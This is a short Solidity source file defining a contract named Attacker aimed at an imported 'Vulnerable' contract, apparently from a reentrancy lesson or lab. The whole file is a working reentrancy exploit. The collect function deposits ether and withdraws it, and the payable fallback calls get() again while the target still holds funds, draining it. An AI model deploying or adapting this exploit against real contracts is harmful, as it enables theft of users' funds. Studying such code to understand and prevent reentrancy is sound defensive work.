pragma solidity ^0.4.18;

import "./VulnerableContract.sol";

contract Attacker {
  Vulnerable public v;

  function Attacker (address _honeypot) public {
    v = Vulnerable(_honeypot);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }

  function collect() payable public {
    v.put.value(msg.value)();
    v.get();
  }

  function () payable public {
    if (v.balance >= msg.value) {
      v.get();
    }
  }
}